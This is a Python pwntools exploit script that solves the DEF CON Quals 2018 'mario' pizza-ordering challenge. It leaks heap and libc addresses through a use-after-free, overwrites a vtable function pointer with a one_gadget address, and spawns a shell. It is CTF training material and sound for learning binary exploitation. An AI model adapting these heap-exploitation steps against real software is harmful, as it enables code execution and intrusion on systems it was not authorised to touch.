# This exploit is based off of: https://raywang.tech/2018/05/14/DEF-CON-Quals-2018-It-s-a-Me/

from pwn import *

target = process('./mario', env = {"LD_PRELOAD": "./libc.so.6"})
gdb.attach(target, gdbscript = 'entry-break')

# These are just the string values for the tomato / pineapple emojus
pineapple = p32(0x8d8d9ff0)
tomato = p32(0x858d9ff0)

# Functions to deal with the IO with the code

def newCustomer(name):
    print target.recvuntil("Choice: ")
    target.sendline("N")
    print target.recvuntil("Hello, what's your name? ")
    target.sendline(name)

def orderPizzas(ingr):
    print target.recvuntil("Choice: ")
    target.sendline("O")
    qty = len(ingr)
    print target.recvuntil(">> how many pizzas? ")
    target.sendline(str(len(ingr)))
    for i in xrange(qty):
        pizzaQty = len(ingr[i])
        target.sendline(str(pizzaQty))
        for j in xrange(pizzaQty):
            target.sendline(ingr[i][j])
    
def cookPizzas(expl):
	print target.recvuntil("Choice: ")
	target.sendline("C")
	print target.recvuntil("Please explain: ")
	target.sendline(expl)

def leave():
	print target.recvuntil("Choice: ")
	target.sendline("L")

def admire():
	print target.recvuntil("Choice: ")
	target.sendline("A")


def login(name):
	print target.recvuntil("Choice: ")
	target.sendline("L")
	print target.recvuntil("your name? ")
	target.sendline(name)

def explainOverflow(payload):
	print target.recvuntil("Choice: ")
	target.sendline("P")
	print target.recvuntil("yourself: ")
	target.sendline(payload)

def infoLeak():
	print target.recvuntil("Choice: ")
	target.sendline("W")
	print target.recvuntil("to say: ")
	leak = target.recvline()
	leak = leak.replace("\x0a", "")
	leak = u64(leak + "\x00"*(8 - len(leak)))
	print "[+] [+] [+] leak is: " + hex(leak) 
	return leak


# Create the first user
newCustomer("guyinatuxedo")

# Setup the pizza ingredients to have the pineapple ingredient appended together, and pass the free check
pizzas = [[tomato]] +  [["\xe0" + pineapple[:2], pineapple[2:] + "00"]] * 16

# Order the pizzas
orderPizzas(pizzas)

# Cook the pizzas, cause Mario to get upset over pineapple, and cause our explanation to get freed
cookPizzas("0"*200)

# Go back to the first menu to get the infoleak
leave()

# Get the heap infoleak, figure out heap base
heapLeak = infoLeak()
heapBase = heapLeak - 0x130a0

# Make a second customer
newCustomer("15935728")

# Just order a single tomato pizza, setup the free for the explanation
orderPizzas([[tomato]])
cookPizzas("1"*200)

# Get the libc infoleak, 
leave()
libcLeak = infoLeak()
libcBase = libcLeak - 0x3c4b78

# Login as the second user, groom the heap to prep for the heap overflow of vtable function pointer

login("15935728")
orderPizzas([[tomato]])
cookPizzas("1111")
leave()

# Figure out the oneGadget address, and where it will be
oneGadget = libcBase + 0x4526a
oneGadgetPtr = heapLeak - 0xf70

# Form the payload for the heap overflow of vtable function pointer

payload = p64(oneGadget) 
payload += "0"*(0xa0 - len(payload))
payload += p64(oneGadgetPtr) 

# Login as the first user, and send the payload
login("guyinatuxedo")
explainOverflow(payload)

raw_input()

# Login as the second user, and admire the pies to execute our onegadget
login("15935728")
admire()

# Drop to an interactive shell
target.interactive()
